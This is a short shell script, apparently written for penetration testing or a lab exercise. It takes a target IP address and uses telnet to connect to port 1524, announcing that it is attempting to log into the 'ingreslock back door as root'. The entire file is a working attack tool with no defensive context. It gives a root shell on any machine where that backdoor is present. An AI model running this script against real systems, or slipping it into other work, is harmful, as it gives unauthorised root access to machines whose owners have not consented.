#! /bin/sh
if [ -z "$1" ]
      then
          echo "usage: ingreslockBackDoor.sh 'ip'"
          exit 1
fi

echo "Attempting to log into ingreslock back door as root\n"
telnet $1 1524
